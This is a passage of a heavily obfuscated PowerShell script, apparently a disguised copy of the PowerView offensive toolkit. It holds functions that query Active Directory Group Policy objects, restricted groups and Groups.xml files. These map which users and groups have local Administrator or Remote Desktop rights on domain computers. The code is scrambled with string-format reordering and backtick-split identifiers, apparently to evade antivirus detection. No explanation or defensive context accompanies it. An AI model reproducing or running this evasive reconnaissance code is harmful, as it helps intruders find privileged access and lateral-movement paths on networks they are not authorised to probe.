                        ("{0}{2}{1}"-f 'M','rs',("{1}{0}"-f 'e','emb')) = ${memB`erS}
                    }

                    &("{1}{2}{0}{3}" -f'c','Ne',("{2}{0}{1}" -f '-','Obje','w'),'t') -TypeName ("{0}{1}"-f 'PSO',("{1}{0}" -f 'ject','b')) -Property ${GpO`pR`op`e`RtIeS}
                }
            }
        }
    }

    end {
        if(${u`sePs`driVe} -and ${ranDDr`I`VE}) {
            &("{2}{3}{1}{0}"-f'se','rbo',("{1}{0}" -f't','Wri'),("{0}{1}" -f'e','-Ve')) ('Rem'+'o'+("{1}{0}" -f' ','ving')+'t'+("{1}{0}"-f' ','emp')+'P'+'SD'+("{1}{0}" -f'e ','riv')+"$RandDrive")
            &("{0}{3}{1}{2}" -f'G',("{1}{0}"-f'SD','-P'),("{0}{1}"-f'r','ive'),'et') -Name ${rAN`Ddr`iVE} -ErrorAction ("{2}{1}{0}{3}"-f'tin',("{1}{2}{0}"-f'on','ntly','C'),("{1}{0}" -f'e','Sil'),'ue') | &("{0}{2}{1}" -f ("{2}{3}{0}{1}" -f'v','e-PSD','R','emo'),'e','riv')
        }
    }
}



function GET`-`N`etgpO {

    [CmdletBinding()]
    Param (
        [Parameter(valUefROmPIpeliNE=${Tr`UE})]
        [String]
        ${G`PO`NAme} = '*',

        [String]
        ${D`IsPLaYNA`Me},

        [String]
        ${D`o`mAIN},

        [String]
        ${DOMaIn`COntR`o`LLER},
        
        [String]
        ${a`DsPA`Th},

        [ValidateRange(1,10000)] 
        [Int]
        ${P`Ag`EsIZE} = 200

    )

    begin {
        ${GPO`seArC`HER} = &("{4}{3}{2}{0}{1}" -f 'he','r','rc',("{0}{2}{1}"-f 'et-','omainSea','D'),'G') -Domain ${do`ma`In} -DomainController ${D`o`maI`NCo`NtrollER} -ADSpath ${A`DSP`ATh} -PageSize ${p`AGe`sI`ze}
    }

    process {
        if (${g`pO`sEar`chEr}) {
            if(${D`Is`p`lAYNAMe}) {
                ${gPoS`E`ArcH`er}."FILt`eR"="(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))"
            }
            else {
                ${Gp`OsEA`Rcher}."f`IlT`eR"="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"
            }

            ${G`PO`seaRcH`er}.("{1}{0}" -f ("{0}{1}" -f 'nd','All'),'Fi')."InVO`KE"() | &("{0}{3}{1}{2}" -f 'Wh','-',("{0}{1}"-f 'O','bject'),'ere') {${_}} | &("{3}{2}{4}{1}{0}"-f't',("{0}{1}"-f 'ch-','Objec'),'or','F','Ea') {
                
                &("{4}{0}{3}{2}{1}"-f't',("{0}{1}" -f 'pe','rty'),'Pro',("{0}{1}" -f '-L','DAP'),("{1}{2}{0}" -f 'r','Conv','e')) -Properties ${_}."p`R`OpeRtIEs"
            }
        }
    }
}


function GEt-NEtgp`o`g`R`oUP {


    [CmdletBinding()]
    Param (
        [String]
        ${GP`OnA`mE} = '*',

        [String]
        ${DIsP`l`AynAMe},

        [Switch]
        ${r`eS`OlvEsI`Ds},

        [String]
        ${DOm`AIn},

        [String]
        ${dOmaI`NC`o`NT`RoLler},

        [String]
        ${Adspa`Th},

        [Switch]
        ${u`S`ePsDrIVE},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`AGES`ize} = 200
    )

    
    &("{2}{0}{1}" -f 'e',("{1}{0}"-f'-NetGPO','t'),'G') -GPOName ${gPo`N`AMe} -DisplayName ${G`pON`AmE} -Domain ${doMa`iN} -DomainController ${doMA`I`NcO`NTRo`lLER} -ADSpath ${Ad`Sp`ATh} -PageSize ${p`AGeSI`zE} | &("{0}{1}{2}{3}"-f 'Fo',("{1}{0}"-f'ac','re'),'h-',("{1}{0}" -f't','Objec')) {

        ${M`emB`E`ROF} = ${N`Ull}
        ${m`eMBerS} = ${n`ULL}
        ${Gpo`D`iSpLay`NA`mE} = ${_}."diS`PLay`NA`Me"
        ${G`pO`NaMe} = ${_}."NA`ME"
        ${gp`o`pATh} = ${_}."gpc`F`ileS`YSpa`Th"

        ${p`A`RsearGS} =  @{
            ("{3}{0}{1}{2}" -f ("{1}{0}"-f'Tmpl','t'),'Pa','th','Gp') = (("$GPOPath\MACHINE\Microsoft\Windows "+'')+((("{1}{0}"-f'4','NTYh')+'Se'+("{0}{1}" -f 'cE','dit')+'Yh4'+("{2}{0}{1}"-f'ptTmp','l.inf','G'))-REPlacE ([ChAr]89+[ChAr]104+[ChAr]52),[ChAr]92))
            ("{1}{2}{0}"-f("{0}{1}" -f 'SDr','ive'),'U','seP') = ${U`s`Eps`dRivE}
        }

        
        ${I`Nf} = &("{0}{2}{1}" -f ("{0}{1}" -f'Get-G','p'),'pl','tTm') @ParseArgs

        if(${i`NF}."gROup`meMb`E`Rsh`Ip") {

            ${M`EmBeR`OF} = ${I`Nf}."Gro`UP`MEMbe`RShiP" | &("{0}{2}{1}{3}" -f 'Ge','e',("{1}{2}{0}" -f 'b','t','-Mem'),'r') ("{1}{0}{3}{2}" -f("{0}{1}"-f 'M','embe'),'*','f','ro') | &("{0}{3}{2}{1}" -f'F','ct',("{0}{1}{2}"-f'Ea','ch-Ob','je'),'or') { ${I`Nf}."g`RoU`pmemb`er`shiP".(${_}."N`AME") } | &("{2}{3}{0}{1}" -f ("{0}{1}{2}" -f'ac','h-Obj','e'),'ct','Fo','rE') { ${_}.("{1}{0}" -f 'im','tr')."I`NV`oke"('*') }
            ${m`e`mbErS} = ${I`Nf}."G`ROu`pMEM`B`ersHip" | &("{1}{2}{0}"-f'er','G',("{2}{1}{0}"-f 'b','Mem','et-')) ("{1}{2}{0}" -f's',("{1}{0}"-f 'emb','*M'),'er') | &("{1}{2}{0}{3}"-f("{0}{1}" -f'O','bje'),("{0}{1}" -f'For','Eac'),'h-','ct') { ${i`Nf}."GRO`Up`MeMBE`RsHip".(${_}."N`AmE") } | &("{1}{0}{3}{2}"-f'orE','F',("{1}{0}" -f'ect','j'),("{0}{1}{2}" -f'ac','h-O','b')) { ${_}.("{0}{1}" -f't','rim')."iN`VOKe"('*') }

            
            if (${M`eMBE`RS} -or ${M`embEr`oF}) {

                
                if(!${mEMb`E`ROf}) {
                    ${memB`E`RoF} = ("{2}{0}{1}" -f'2',("{0}{1}" -f'-54','4'),("{1}{0}{2}"-f '1-5-','S-','3'))
                }

                if(${rEs`o`L`VEsiDs}) {
                    ${mem`B`erof} = ${m`e`mbE`RoF} | &("{0}{4}{1}{2}{3}"-f 'F','ac',("{0}{1}" -f 'h-O','bje'),'ct','orE') {&("{3}{1}{0}{2}"-f("{1}{0}"-f 'oN','dT'),("{1}{0}"-f'i','rt-S'),'ame',("{0}{1}" -f 'C','onve')) ${_}}
                    ${mEm`Be`RS} = ${M`eM`BErS} | &("{1}{3}{2}{0}" -f 'ct','F','je',("{2}{1}{0}"-f'Ob','-','orEach')) {&("{3}{0}{2}{1}" -f("{1}{0}"-f't-Sid','er'),'me',("{0}{1}"-f 'To','Na'),("{1}{0}"-f'onv','C')) ${_}}
                }

                if(${member`of} -isnot [system.array]) {${m`e`MbERoF} = @(${M`EMBe`ROF})}
                if(${Me`mb`ERS} -isnot [system.array]) {${mEMb`E`Rs} = @(${m`EmBE`Rs})}

                ${gPoPrOP`ERti`Es} = @{
                    ("{0}{1}{3}{2}"-f'GPO','Dis',("{0}{1}"-f'ayN','ame'),'pl') = ${Gp`Odi`s`P`laynAmE}
                    ("{0}{1}"-f'GPO',("{0}{1}"-f'N','ame')) = ${gp`O`Name}
                    ("{1}{2}{0}" -f 'h',("{0}{1}" -f'GPO','P'),'at') = ${g`PoPA`TH}
                    ("{1}{0}"-f'ers',("{0}{1}" -f 'Fi','lt')) = ${n`ULl}
                    ("{1}{0}{2}" -f 'O',("{0}{1}"-f'M','ember'),'f') = ${MeMBer`of}
                    ("{0}{2}{1}" -f'M','rs',("{1}{0}"-f'e','emb')) = ${ME`mbErS}
                }

                &("{2}{0}{1}" -f ("{1}{0}"-f'Ob','w-'),("{0}{1}"-f 'jec','t'),'Ne') -TypeName ("{1}{0}"-f't',("{2}{1}{0}" -f'c','e','PSObj')) -Property ${g`pOpROp`ERt`iES}
            }
        }

        ${PA`R`SeArgS} =  @{
            ("{1}{2}{0}" -f("{1}{0}"-f'th','pa'),("{1}{0}" -f'M','GroupsX'),'L') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            ("{2}{0}{1}"-f'ol',("{1}{0}" -f's','veSid'),'Res') = ${r`ESOlv`es`IDS}
            ("{1}{0}{2}"-f'SDr',("{1}{0}"-f 'eP','Us'),'ive') = ${UsE`pS`DRiVE}
        }

        &("{2}{0}{1}{4}{3}" -f '-G','r','Get',("{1}{0}" -f 'ML','upsX'),'o') @ParseArgs
    }
}


function FIN`d-G`PoLocA`T`iOn {


    [CmdletBinding()]
    Param (
        [String]
        ${uS`e`RNAMe},

        [String]
        ${Gr`O`UpName},

        [String]
        ${DOMA`iN},

        [String]
        ${doMAI`NCOnTrO`Ll`Er},

        [String]
        ${lOcalGr`O`Up} = ("{2}{0}{1}{3}" -f 'in',("{0}{1}" -f 'is','trat'),'Adm','ors'),
        
        [Switch]
        ${u`S`ePsDRIVE},

        [ValidateRange(1,10000)] 
        [Int]
        ${pAGES`I`ZE} = 200
    )

    if(${USE`RnA`mE}) {

        ${U`seR} = &("{1}{2}{0}"-f'r',("{0}{1}"-f'Ge','t-NetU'),'se') -UserName ${US`Er`N`AmE} -Domain ${dO`M`Ain} -DomainController ${DO`MainC`ONTr`O`lLER} -PageSize ${pAg`EsI`Ze}
        ${usEr`siD} = ${us`eR}."o`B`JEctSID"

        if(!${uSerS`ID}) {    
            Throw (("{0}{1}"-f'Us','er')+' '+("'$UserName' "+'')+'n'+'ot '+'fo'+("{0}{1}" -f'u','nd!'))
        }

        ${TArg`E`TsID} = ${u`SerSID}
        ${Obj`Ec`T`samAcCoUntnamE} = ${u`seR}."s`A`Mac`cO`UNtnAMe"
        ${OBJ`ECtd`iSTn`A`ME} = ${u`Ser}."diST`iNgU`iSHE`dNAMe"
    }
    elseif(${gR`ou`p`NAme}) {

        ${g`Ro`UP} = &("{0}{3}{1}{2}" -f 'G',("{1}{0}"-f'u','Gro'),'p',("{0}{1}" -f 'et','-Net')) -GroupName ${Gr`o`UpNAme} -Domain ${do`mA`IN} -DomainController ${DoMAI`N`CONTR`olLeR} -FullData -PageSize ${p`A`gESIzE}
        ${GRO`UPS`ID} = ${grO`UP}."obJE`Ct`SiD"

        if(!${g`Ro`UPsID}) {    
            Throw ('G'+("{0}{1}" -f'roup',' ')+("'$GroupName' "+'')+'no'+'t '+'f'+'ou'+'nd!')
        }

        ${tArget`S`iD} = ${gRO`Up`Sid}
        ${objeCtS`A`MaCCO`UNTN`Ame} = ${g`ROUp}."sAMaCCO`U`Ntn`A`me"
        ${obJ`eCtD`iStna`me} = ${g`RO`Up}."DIsTiNgU`i`shEdNa`me"
    }
    else {
        throw ("{3}{4}{2}{0}{5}{6}{1}" -f'oup',("{1}{0}{2}"-f 'pecif',' s','ied!'),("{1}{0}" -f'Gr','r -'),("{1}{0}" -f'er','-Us'),("{0}{1}" -f 'Name',' o'),("{0}{3}{2}{1}" -f'N','must ','me ','a'),'be')
    }

    if(${LO`ca`L`gRoup} -like ("{2}{0}{1}"-f'Ad',("{0}{1}"-f'm','in*'),'*')) {
        ${LOcaL`S`iD} = ("{0}{1}{2}" -f'S',("{0}{1}{2}" -f'-1','-5-','32-54'),'4')
    }
    elseif ( (${LOCal`GR`oUP} -like ("{1}{0}"-f'*',("{1}{0}" -f'P','*RD'))) -or (${L`OCALgrO`Up} -like ("{2}{1}{0}" -f'te*','emo','*R')) ) {
        ${lo`caL`SId} = ("{2}{1}{0}"-f("{0}{1}"-f '-32-55','5'),'-5','S-1')
    }
    elseif (${lO`CALG`RoUP} -like ("{0}{1}"-f'S-1','-5*')) {
        ${L`ocA`lSId} = ${LOCAL`Gr`oUP}
    }
    else {
        throw ((("{16}{5}{6}{20}{8}{17}{2}{12}{11}{4}{14}{1}{3}{18}{21}{13}{15}{10}{0}{19}{7}{9}" -f 't','a ','s','{','{0}RD',("{1}{0}"-f'alGr','c'),("{0}{1}" -f'o','up m'),'e s',("{1}{0}" -f 'is','in'),'id.',' ',', ','{0}','0','P{0}, or ','}','Lo',("{1}{0}" -f'tor','tra'),'0','yp','ust be {0}Adm','}S-1-5-X{'))-F  [cHaR]39)
    }

    &("{1}{2}{3}{4}{0}"-f 'e','Wr',("{1}{0}" -f 'te-','i'),("{0}{1}"-f 'Ve','rb'),'os') (("{0}{1}"-f 'L','oca')+("{1}{0}"-f':','lSid')+' '+"$LocalSID")
    &("{0}{1}{2}" -f 'W',("{1}{0}" -f'e-Ve','rit'),("{1}{0}"-f 'ose','rb')) ('Tar'+("{0}{1}"-f 'get','S')+'i'+'d: '+"$TargetSid")
    &("{0}{3}{2}{4}{1}"-f 'W','ose','-V',("{1}{0}"-f 'te','ri'),'erb') ('T'+'a'+("{0}{2}{3}{1}" -f'rgetOb','ctDi','j','e')+("{1}{0}"-f 'm','stNa')+'e: '+"$ObjectDistName")

    if(${t`A`RGetS`id} -isnot [system.array]) { ${tAR`gETS`iD} = @(${TAR`GE`Ts`iD}) }

    
    
    ${TAr`g`E`TsId} += &("{2}{0}{1}" -f 't-N',("{1}{0}"-f 'oup','etGr'),'Ge') -Domain ${Do`mA`In} -DomainController ${D`o`mAIN`co`N`TRoLlER} -PageSize ${PA`gESi`zE} -UserName ${ob`je`C`TSA`MaCCOuNTNaMe} -RawSids

    if(${tAR`g`eTSid} -isnot [system.array]) { ${T`ArGET`siD} = @(${tArg`eTs`Id}) }

    &("{1}{2}{3}{0}"-f("{1}{0}"-f 'bose','r'),'Wr',("{1}{0}"-f 'te-','i'),'Ve') ('Eff'+'e'+("{2}{0}{1}"-f 'tiv','e ','c')+'ta'+("{0}{1}" -f 'rget',' ')+'s'+'ids'+': '+"$TargetSid")

    ${gpogROUp`A`R`GS} =  @{
        ("{0}{1}"-f ("{1}{0}"-f'ma','Do'),'in') = ${dO`MA`in}
        ("{0}{3}{2}{1}{4}"-f'Dom',("{0}{1}" -f'roll','e'),'nt',("{1}{0}"-f 'o','ainC'),'r') = ${d`oMa`InCon`T`RoLlEr}
        ("{2}{0}{1}"-f'eP',("{0}{1}"-f 'SDr','ive'),'Us') = ${USE`pSd`RIve}
        ("{0}{1}"-f ("{1}{0}"-f'iz','PageS'),'e') = ${pAG`e`s`izE}
    }

    
    
    ${GP`OGroU`ps} = &("{3}{2}{1}{0}"-f("{0}{2}{1}" -f'G','oup','POGr'),'t',("{0}{1}" -f 'et-N','e'),'G') @GPOGroupArgs | &("{1}{0}{2}{3}"-f ("{0}{1}"-f'rEa','c'),'Fo','h',("{1}{0}" -f'ect','-Obj')) {
        
        if (${_}."mE`m`BerS") {
            ${_}."MEMB`e`Rs" = ${_}."Mem`Be`RS" | &("{0}{2}{1}{3}" -f'Whe','jec',("{0}{1}"-f're-O','b'),'t') {${_}} | &("{0}{1}{2}"-f 'Fo',("{0}{2}{1}"-f'rE','ch-Obje','a'),'ct') {
                if(${_} -match ("{0}{1}"-f'S-','1-5')) {
                    ${_}
                }
                else {
                    
                    &("{1}{3}{0}{2}{4}" -f ("{0}{1}" -f 'r','t-Na'),'Con',("{0}{2}{1}" -f 'm','ToSi','e'),'ve','d') -ObjectName ${_} -Domain ${dOma`in}
                }
            }

            
            if(${_}."MeMB`e`Rs" -isnot [system.array]) { ${_}."ME`M`BeRs" = @(${_}."M`EMBe`Rs") }
            if(${_}."mEm`BER`oF" -isnot [system.array]) { ${_}."mEM`BER`oF" = @(${_}."M`EmB`eroF") }
            
            if(${_}."m`eMb`Ers") {
                try {
                    

                    
                    if( (&("{3}{2}{0}{4}{1}" -f("{0}{1}" -f'e-O','b'),'ect',("{0}{1}"-f 'om','par'),'C','j') -ReferenceObject ${_}."MEm`BERS" -DifferenceObject ${T`A`RgE`TSid} -IncludeEqual -ExcludeDifferent) ) {
                        if (${_}."mEMBE`R`Of" -contains ${l`oCal`SID}) {
                            ${_}
                        }
                    }
                } 
                catch {
                    &("{0}{1}{2}" -f("{0}{1}"-f'Wr','ite-'),'Deb','ug') ('Err'+'or '+'com'+("{0}{1}"-f'pa','rin')+'g '+'m'+("{0}{1}{2}" -f'e','m','bers')+' '+'an'+'d '+("$TargetSid "+'')+': '+"$_")
                }
            }
        }
    }

    &("{2}{1}{0}" -f("{1}{0}"-f'ose','b'),'r',("{0}{1}"-f 'Write-','Ve')) ('GP'+'O'+("{1}{0}{2}"-f'rou','g','ps: ')+"$GPOgroups")
    ${pr`oC`E`SsE`dgUIDS} = @{}

    
    ${GP`Og`ROUpS} | &("{3}{0}{2}{1}"-f 'Ob','t','jec',("{1}{0}" -f'here-','W')) {${_}} | &("{4}{2}{0}{3}{1}" -f'ch-','t','Ea',("{0}{1}" -f 'O','bjec'),'For') {

        ${G`POGU`ID} = ${_}."GpoN`AmE"

        if( -not ${prOCesse`d`Gu`I`dS}[${GP`oGuiD}] ) {
            ${GPo`NaME} = ${_}."G`PODiSplAy`NaMe"
            ${f`Il`TErS} = ${_}."Fil`Ters"

            
            &("{1}{0}{2}"-f't-','Ge',("{1}{0}"-f 'OU','Net')) -Domain ${D`om`AIN} -DomainController ${do`M`AINc`ont`ROL`LER} -GUID ${GP`ogUId} -FullData -PageSize ${pA`gES`IZe} | &("{2}{1}{3}{0}" -f'ect',("{1}{0}" -f'h-','ac'),("{0}{1}"-f 'For','E'),'Obj') {

                if(${fIlT`erS}) {
                    
                    
                    ${OuCOM`p`UtE`RS} = &("{3}{0}{2}{1}" -f't-N',("{0}{1}" -f'tComp','uter'),'e','Ge') -ADSpath ${_}."aDS`PATH" -FullData -PageSize ${pAGE`Si`zE} | &("{2}{0}{1}"-f 'b',("{0}{1}" -f 'jec','t'),("{0}{1}{2}"-f'Wh','e','re-O')) {
                        ${_}."aDSp`AtH" -match (${Fi`LTe`RS}."v`AluE")
                    } | &("{1}{0}{2}{3}"-f'-Ob',("{0}{1}{2}"-f'F','or','Each'),'j','ect') { ${_}."dnsh`ostNa`me" }
                }
                else {
                    ${oUCoM`PU`Te`Rs} = &("{3}{2}{1}{0}{4}" -f ("{0}{1}" -f 'mput','e'),'Co','t',("{0}{1}" -f'Get','-Ne'),'r') -ADSpath ${_}."a`dsP`ATH" -PageSize ${p`AgE`Size}
                }

                ${gP`oloC`AtI`on} = &("{2}{0}{1}" -f'ec','t',("{1}{2}{0}" -f'-Obj','Ne','w')) ("{1}{2}{0}" -f 't',("{0}{1}" -f 'PSObj','e'),'c')
                ${G`POl`oCAtiOn} | &("{3}{0}{2}{1}" -f ("{2}{0}{1}"-f 'd-M','em','d'),'er','b','A') ("{2}{1}{0}" -f 'y',("{0}{2}{1}" -f 'e','pert','pro'),'Not') ("{1}{0}{3}{2}"-f 'ect','Obj','e','Nam') ${ObJEC`T`Di`StnA`me}
                ${g`poloCAt`I`on} | &("{2}{3}{0}{1}"-f 'm','ber',("{1}{0}" -f 'd-','Ad'),'Me') ("{2}{1}{0}" -f'y','ert',("{1}{0}"-f'eprop','Not')) ("{0}{2}{1}" -f'GP','me','Ona') ${G`PONa`me}
                ${Gpol`ocATI`oN} | &("{2}{1}{0}{3}"-f ("{1}{0}" -f'embe','M'),'d-','Ad','r') ("{2}{1}{0}{3}" -f ("{1}{0}" -f 't','per'),'ro',("{1}{0}" -f 'otep','N'),'y') ("{0}{1}"-f 'G',("{0}{1}" -f'POg','uid')) ${gP`ogu`ID}
                ${G`PoLO`CA`TioN} | &("{2}{0}{1}" -f'-Me',("{1}{0}" -f'er','mb'),'Add') ("{0}{2}{1}" -f'No',("{1}{0}" -f'ty','per'),("{1}{0}"-f 'pro','te')) ("{0}{2}{1}" -f ("{0}{1}"-f 'Conta','in'),("{1}{0}"-f 'Name','r'),'e') ${_}."dISTinGUish`e`d`NAMe"
                ${gpO`lo`CAt`ion} | &("{1}{3}{0}{2}"-f 'mb',("{1}{0}"-f '-M','Add'),'er','e') ("{0}{1}{2}" -f'No',("{1}{0}"-f'pr','te'),("{0}{1}{2}"-f'o','per','ty')) ("{1}{2}{0}" -f ("{1}{0}" -f 'rs','te'),'Co','mpu') ${O`Uc`ompu`TERS}
                ${GpOLoca`T`Ion}
            }

            
            
            
            
            
            
            
            
            
            
            
            
            

            
            
            
            
            
            
            
            
            

            
            ${PrOCE`s`SE`dG`UIds}[${G`PO`guId}] = ${TR`Ue}
        }
    }

}


function fInD-GP`OcOMpUTE`RAD`m`IN {


    [CmdletBinding()]
    Param (
        [Parameter(VAluEFrOMPipELINe=${t`RuE})]
        [String]
        ${c`OmpuT`E`RNa`ME},

        [String]
        ${O`U`NamE},

        [String]
        ${d`o`MaIn},

        [String]
        ${d`oM`AINConTR`o`L`LEr},

        [Switch]
        ${RE`c`UrsE},

        [String]
        ${LO`CaLG`ROuP} = ("{3}{0}{1}{2}"-f("{2}{0}{1}" -f 's','trat','i'),'o','rs',("{1}{0}"-f 'n','Admi')),

        [Switch]
        ${uS`ePsdR`i`Ve},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`ges`IzE} = 200
    )

    process {
    
        if(!${cOm`put`eR`NamE} -and !${o`Un`Ame}) {
            Throw ("{1}{4}{5}{2}{0}{8}{10}{3}{6}{7}{9}"-f 'r -','-Co','e o','t','mpu',("{2}{1}{0}"-f'm','erNa','t'),("{0}{1}" -f' ','be '),("{1}{0}" -f 'rovi','p'),("{0}{1}"-f'OUNa','me'),'ded',("{0}{1}"-f' m','us'))
        }

        if(${CO`mPU`TernAmE}) {
            ${C`OM`pute`RS} = &("{3}{1}{2}{0}" -f("{1}{0}"-f'ter','pu'),("{1}{0}"-f'-Net','t'),'Com','Ge') -ComputerName ${Co`mp`UT`ERNAME} -Domain ${dOM`A`in} -DomainController ${D`OM`Ai`NcoNTroLlER} -FullData -PageSize ${pages`I`ze}

            if(!${Co`m`Put`eRS}) {
                throw ('Com'+("{1}{0}" -f'ute','p')+'r'+' '+("$Computer "+'')+'in'+' '+("{1}{0}" -f 'oma','d')+'in'+' '+("'$Domain' "+'')+'not'+' '+'fou'+'nd!')
            }
            
            ForEach(${CoM`PU`TeR} in ${coM`pU`T`ers}) {
                
                ${d`N} = ${co`mPUter}."Di`sti`NGuI`shEDNAmE"

                ${TAR`g`eto`US} = ${d`N}.("{1}{0}"-f("{0}{1}"-f'p','lit'),'s')."iNV`oKE"(",") | &("{2}{0}{1}{3}"-f ("{1}{0}" -f'ch','orea'),("{1}{0}" -f'bj','-O'),'F','ect') {
                    if(${_}.("{1}{2}{0}" -f 'ith','st',("{0}{1}" -f 'ar','tsw'))."i`NVoke"("OU=")) {
                        ${Dn}.("{1}{2}{0}"-f'ing','sub','str')."iNVO`Ke"(${d`N}.("{0}{2}{1}"-f("{1}{0}"-f 'nde','i'),'of','x')."i`NVoKe"(${_}))
                    }
                }
            }
        }
        else {
            ${TA`RGE`T`OUS} = @(${OUn`AmE})
        }

        &("{1}{0}{2}{3}"-f ("{1}{0}"-f'-V','te'),'Wri',("{1}{0}"-f'o','erb'),'se') ('Ta'+'rg'+'et '+'OU'+'s: '+"$TargetOUs")

        ${TARg`e`Tous} | &("{0}{2}{1}{3}" -f 'W',("{1}{0}"-f 'e','Obj'),("{1}{0}"-f'-','here'),'ct') {${_}} | &("{3}{4}{2}{1}{0}" -f 'ect','bj',("{1}{0}" -f'-O','ch'),'Fo','rea') {

            ${OU} = ${_}

            
            ${G`pOgrou`PS} = &("{2}{0}{1}"-f ("{0}{1}"-f'e','t-Net'),'OU','G') -Domain ${D`oma`IN} -DomainController ${DOmaI`Nc`ONtRO`l`LeR} -ADSpath ${_} -FullData -PageSize ${PA`ge`sIZE} | &("{1}{3}{2}{0}" -f 't','For',("{0}{1}"-f'b','jec'),("{0}{2}{1}"-f'each','O','-')) { 
                
                ${_}."gPli`Nk"."Spl`it"("][") | &("{3}{1}{0}{2}"-f 'h-','eac',("{1}{0}" -f 'ect','Obj'),'For') {
                    if (${_}.("{1}{3}{2}{0}"-f'h','st','wit',("{1}{0}"-f 'ts','ar'))."IN`V`Oke"(("{0}{1}"-f 'LD','AP'))) {
                        ${_}.("{1}{0}" -f'it','spl')."I`NVo`KE"(";")[0]
                    }
                }
            } | &("{1}{0}{3}{2}" -f("{0}{1}"-f 'or','each'),'F','ct',("{1}{0}" -f'bje','-O')) {
                ${GPo`gRoUPa`R`gS} =  @{
                    ("{0}{1}" -f'D',("{1}{0}"-f'main','o')) = ${d`OM`Ain}
                    ("{3}{0}{2}{1}" -f ("{0}{1}" -f 'a','inC'),("{2}{0}{1}"-f'll','er','ntro'),'o','Dom') = ${DoMa`iN`cOnT`RolLeR}
                    ("{2}{0}{1}"-f 'Spa','th','AD') = ${_}
                    ("{0}{2}{1}"-f 'U',("{1}{0}" -f'Drive','S'),'seP') = ${Us`Ep`SdRI`VE}
                    ("{2}{0}{1}"-f'g',("{1}{0}"-f 'Size','e'),'Pa') = ${PaGes`I`zE}
                }

                
                &("{1}{2}{3}{0}"-f 'up','Ge','t-N',("{0}{2}{1}" -f 'etGP','Gro','O')) @GPOGroupArgs
            }

            
            ${gPo`g`RoUPS} | &("{2}{0}{1}"-f("{2}{1}{0}"-f 'c','Obje','ere-'),'t','Wh') {${_}} | &("{0}{3}{1}{2}"-f ("{0}{1}" -f 'F','ore'),'bj','ect',("{0}{1}"-f'ach','-O')) {
                ${G`PO} = ${_}
                ${G`pO}."mEmB`Ers" | &("{0}{3}{2}{1}" -f'For','ct',("{1}{0}{2}"-f '-','h','Obje'),'eac') {

                    
                    ${obj`e`CT} = &("{0}{2}{3}{1}"-f("{1}{0}"-f 't-','Ge'),("{1}{0}" -f't','bjec'),'AD','O') -Domain ${DOm`AIn} -DomainController ${doMa`InC`OntROl`lER} ${_} -PageSize ${Pa`gE`SIzE}

                    ${GpocOMpU`T`ErA`D`miN} = &("{1}{2}{0}" -f'ect','New',("{0}{1}" -f'-O','bj')) ("{1}{2}{0}" -f't','P',("{1}{0}"-f'ec','SObj'))
                    ${gpocoMP`Ut`Er`Ad`M`in} | &("{2}{3}{0}{1}"-f 'Me',("{0}{1}"-f'mbe','r'),'Add','-') ("{2}{1}{0}"-f 'y',("{2}{0}{1}"-f'pro','pert','ote'),'N') ("{2}{0}{1}" -f("{0}{1}" -f 'er','Na'),'me',("{0}{1}"-f 'Com','put')) ${COm`P`UTeR`NAme}
                    ${G`POcoM`pU`TE`RaD`Min} | &("{1}{2}{0}{3}" -f'em','Add','-M','ber') ("{2}{1}{0}" -f ("{0}{1}"-f 'ope','rty'),'epr','Not') 'OU' ${o`U}
                    ${GPOc`om`Pu`TERa`DMIn} | &("{2}{0}{1}" -f 'd',("{2}{1}{0}" -f 'er','mb','d-Me'),'A') ("{3}{0}{2}{1}"-f ("{1}{0}" -f 'epr','t'),'rty','ope','No') ("{4}{1}{0}{2}{3}" -f ("{1}{0}"-f'pla','s'),'ODi','yNa','me','GP') ${G`pO}."g`pO`dI`splaY`NAmE"
                    ${GP`oCO`MPU`TERADmin} | &("{1}{2}{0}" -f("{2}{1}{0}" -f 'r','mbe','d-Me'),'A','d') ("{1}{2}{0}"-f 'ty','Not',("{1}{0}" -f 'er','eprop')) ("{1}{0}{2}" -f 'OP','GP','ath') ${G`PO}."Gp`OpAth"
                    ${gPoco`Mp`U`T`eRaDmIN} | &("{0}{1}{2}" -f ("{0}{1}"-f'Add','-Me'),'mbe','r') ("{3}{1}{2}{0}" -f'rty','te',("{0}{1}"-f 'pro','pe'),'No') ("{0}{2}{1}" -f'Obj',("{1}{0}{2}"-f'm','ctNa','e'),'e') ${O`BjECT}."Na`Me"
                    ${gPoc`O`MpUTE`RADmIn} | &("{3}{0}{2}{1}" -f ("{0}{1}" -f'd-M','e'),'ber','m','Ad') ("{0}{2}{3}{1}"-f 'No','ty',("{0}{1}" -f 'te','pro'),'per') ("{2}{0}{1}" -f'e',("{1}{0}"-f 'DN','ct'),'Obj') ${obj`ECt}."dIStiNGuiS`H`Ed`NAme"
                    ${Gpoc`OMp`UTEr`Ad`m`iN} | &("{3}{2}{1}{0}"-f'r',("{1}{0}" -f'embe','M'),'-','Add') ("{1}{0}{2}" -f 'r',("{2}{0}{1}" -f 'o','teprope','N'),'ty') ("{0}{2}{1}" -f("{0}{1}"-f 'O','bje'),'SID','ct') ${_}
                    ${gp`OcOMp`U`T`eRa`DMIn} | &("{1}{2}{0}{3}"-f("{1}{0}" -f 'emb','M'),'A','dd-','er') ("{1}{0}{2}"-f("{1}{0}" -f 'e','rop'),("{0}{1}" -f 'Not','ep'),'rty') ("{0}{1}"-f'IsG',("{0}{1}" -f'rou','p')) $(${oBj`E`ct}."S`A`maCcoUN`TType" -notmatch ("{0}{1}" -f ("{1}{0}"-f'053','8'),("{0}{1}" -f '063','68')))
                    ${GpO`CompUT`e`RAdM`iN} 

                    
                    if(${R`ecUR`sE} -and ${gPo`coM`pUtEra`Dmin}."I`SGrOuP") {

                        &("{1}{0}{4}{3}{2}" -f'rou',("{1}{0}{2}" -f't-Ne','Ge','tG'),("{1}{0}"-f 'er','mb'),'Me','p') -SID ${_} -FullData -Recurse -PageSize ${pagE`SI`zE} | &("{2}{3}{0}{1}" -f("{0}{1}"-f 'ch-Ob','je'),'ct','Fo','rea') {

                            ${m`eMBe`RDn} = ${_}."diSti`NGui`sHe`DnAMe"

                            
                            ${ME`mB`ErdO`MAIN} = ${mE`MBerdN}.("{2}{1}{0}"-f 'ing',("{1}{0}" -f'tr','bS'),'su')."I`NVOKe"(${mEmB`e`RDN}.("{0}{1}{2}" -f 'In','dex','Of')."In`V`OKe"("DC=")) -replace 'DC=','' -replace ',','.'

